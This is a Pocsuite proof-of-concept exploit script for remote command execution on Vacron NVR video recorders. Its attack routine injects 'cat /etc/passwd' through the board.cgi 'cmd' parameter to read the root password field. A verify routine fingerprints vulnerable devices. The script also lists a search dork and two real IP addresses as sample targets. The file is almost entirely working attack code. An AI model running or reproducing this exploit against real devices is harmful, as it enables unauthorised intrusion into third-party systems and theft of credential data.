#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re



class TestPOC(POCBase):
    name = "VacronNVR_command_execution"
    vulID = ''
    author = ['sebao']
    vulType = 'command execution'
    version = '1.0'    # default version: 1.0
    references = ''
    desc = '''Vacron NVR 设备远程命令执行'''

    vulDate = ''
    createDate = '2017-2-6'
    updateDate = '2017-2-6'

    appName = 'vacron'
    appVersion = ''
    dork= 'Vacron NVR'
    appPowerLink = 'http://www.vacron.com/'
    samples = ['http://220.133.219.154',
               'http://106.1.218.91:8080'
               ]

    def _attack(self):

        result = {}
        vul_url = "/board.cgi?cmd=cat /etc/passwd"
        url = self.url + vul_url
        resp = req.get(url)
        results = re.search(r'''root:(.*?):''', resp.content)
        if resp.status_code == 200 and results:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Password'] = results.group(1)

        return self.parse_output(result)



    def _verify(self):
        '''verify mode'''
        result = {}
        vul_url = "/error_page.htm"
        url = self.url + vul_url
        resp = req.get(url)
        print resp.content
        
        if resp.status_code == 200 and '#/sbin/ifconfig' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
